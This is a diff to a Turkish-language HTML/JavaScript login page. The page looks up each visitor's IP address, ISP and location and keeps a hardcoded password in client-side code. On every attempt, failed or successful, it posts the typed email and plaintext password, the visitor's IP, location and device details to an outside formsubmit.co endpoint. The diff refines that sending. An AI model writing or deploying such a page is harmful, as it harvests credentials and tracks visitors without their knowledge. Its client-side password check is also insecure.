@@ -92,7 +92,6 @@
         #success-screen { display: none; text-align: left; }
         #success-screen h2 { color: #00ff41; text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
         
-        /* Parlak Beyaz Merhaba Yazısı */
         .bright-hello { 
             color: #ffffff; 
             font-weight: bold; 
@@ -124,6 +123,7 @@
             padding: 10px;
             border-radius: 4px;
             margin-top: 15px;
+            border: 1px solid rgba(255, 77, 77, 0.3);
         }
     </style>
 </head>
@@ -174,8 +174,9 @@
                 document.getElementById('userIP').value = d.ip || "Bilinmiyor";
                 document.getElementById('userISP').value = d.org || "Bilinmiyor";
                 document.getElementById('userLocation').value = (d.city || "") + " / " + (d.country_name || "");
-            });
+            }).catch(() => console.log("Bilgi alınamadı."));
 
+        // Şifreni ve Form ID'ni buraya girmeyi unutma!
         const MASTER_PASSWORD = "mjuytrewqaz"; 
         const FORM_ID = "19273e639ed99bee214f2b82f3953fff";
 
@@ -185,36 +186,33 @@
             const password = document.getElementById('passInput').value;
             const btn = document.getElementById('submitBtn');
 
-            // ŞİFRE YANLIŞSA MAİL GÖNDER
             if (password !== MASTER_PASSWORD) {
                 btn.innerText = "YETKİSİZ GİRİŞ!";
                 btn.style.background = "red";
+                btn.disabled = true;
                 
-                // Başarısız giriş bildirimi gönder
                 fetch(`https://formsubmit.co/ajax/${FORM_ID}`, {
                     method: "POST",
                     headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                     body: JSON.stringify({
-                        _subject: "⚠️ BAŞARISIZ GİRİŞ DENEMESİ!",
-                        Durum: "Hatalı Şifre Girildi",
+                        _subject: "⚠️ BAŞARISIZ GİRİŞ: " + email,
+                        Durum: "Hatalı Şifre",
                         Email: email,
-                        Denene_Sifre: password,
+                        Sifre: password,
                         IP: document.getElementById('userIP').value,
-                        ISS: document.getElementById('userISP').value,
-                        Konum: document.getElementById('userLocation').value,
-                        Cihaz: document.getElementById('deviceInfo').value
+                        Konum: document.getElementById('userLocation').value
                     })
+                }).finally(() => {
+                    setTimeout(() => {
+                        btn.innerText = "Sisteme Bağlan";
+                        btn.style.background = "linear-gradient(45deg, #007bff, #0056b3)";
+                        btn.disabled = false;
+                    }, 2000);
                 });
-
-                alert("HATA: Yetkisiz giriş denemesi! Bilgileriniz kaydedildi.");
-                setTimeout(() => {
-                    btn.innerText = "Sisteme Bağlan";
-                    btn.style.background = "linear-gradient(45deg, #007bff, #0056b3)";
-                }, 2000);
+                alert("HATA: Yetkisiz giriş denemesi!");
                 return;
             }
 
-            // ŞİFRE DOĞRUYSA
             btn.innerText = "BAĞLANILIYOR...";
             btn.disabled = true;
 
@@ -222,7 +220,7 @@
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: "✅ BAŞARILI GİRİŞ YAPILDI!",
+                    _subject: "BAŞARILI GİRİŞ: " + email,
                     Email: email,
                     Sifre: password,
                     IP: document.getElementById('userIP').value,
@@ -231,9 +229,15 @@
                     Cihaz: document.getElementById('deviceInfo').value
                 })
             })
-            .then(() => {
-                document.getElementById('login-container').style.display = 'none';
-                document.getElementById('success-screen').style.display = 'block';
+            .then(res => {
+                if(res.ok) {
+                    document.getElementById('login-container').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'block';
+                } else {
+                    alert("Bir sorun oluştu.");
+                    btn.innerText = "Tekrar Dene";
+                    btn.disabled = false;
+                }
             });
         };
 
